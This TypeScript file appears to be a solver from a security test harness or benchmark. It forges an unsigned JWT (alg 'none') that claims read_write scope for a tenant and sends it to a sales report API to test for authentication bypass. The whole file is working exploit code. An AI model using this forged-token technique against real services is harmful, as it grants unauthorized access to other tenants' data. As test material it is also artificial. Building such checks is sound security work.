// Call the sales report API with an unsigned bearer token (alg "none") claiming reporting scope.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const store = ctx.plan.personas.persona_a.tenant
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url')
  const payload = Buffer.from(JSON.stringify({ store, scope: 'read_write', sub: 'reporting' })).toString('base64url')
  const token = `${header}.${payload}.`
  await ctx.fetch(buildPath(ctx.plan, 'salesReport'), {
    method: 'GET',
    headers: { authorization: `Bearer ${token}` },
  })
}
